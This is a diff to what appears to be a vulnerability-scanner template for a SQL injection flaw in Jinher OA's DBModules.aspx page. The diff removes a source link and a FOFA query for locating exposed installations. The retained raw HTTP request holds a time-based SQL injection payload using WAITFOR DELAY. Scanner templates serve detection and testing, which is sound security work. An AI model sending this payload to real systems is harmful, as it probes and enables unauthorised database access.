@@ -3,12 +3,8 @@ info:
   name: 金和OA DBModules.aspx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vt7ibbe00bkgz6ru'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vt7ibbe00bkgz6ru
-    fofa: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || app="Jinher-OA"
 http:
 - raw:
   - GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=123;WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
